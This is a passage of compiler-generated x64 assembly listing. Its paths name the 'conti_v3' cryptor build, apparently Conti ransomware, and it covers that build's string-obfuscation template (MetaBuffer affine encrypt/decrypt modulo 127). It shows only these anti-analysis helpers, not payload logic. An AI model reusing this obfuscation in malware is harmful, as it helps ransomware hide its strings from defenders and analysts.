?encrypt@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 22	 add	 r8d, 34			; 00000022H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 51 00 00 00	 mov	 ecx, 81			; 00000051H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 17	 imul	 r8d, ecx, 23

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 0b	 imul	 r8d, eax, 11
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 51	 add	 r8d, 81			; 00000051H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 1e	 sub	 eax, 30
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1e	 add	 r8d, 30
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 5b 00 00 00	 mov	 ecx, 91			; 0000005bH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5b	 add	 r8d, 91			; 0000005bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 60 00 00 00	 mov	 ecx, 96			; 00000060H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2a	 imul	 r8d, ecx, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 20	 add	 eax, 32			; 00000020H
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 03	 sub	 eax, 3
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 03	 add	 r8d, 3
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 16	 sub	 eax, 22
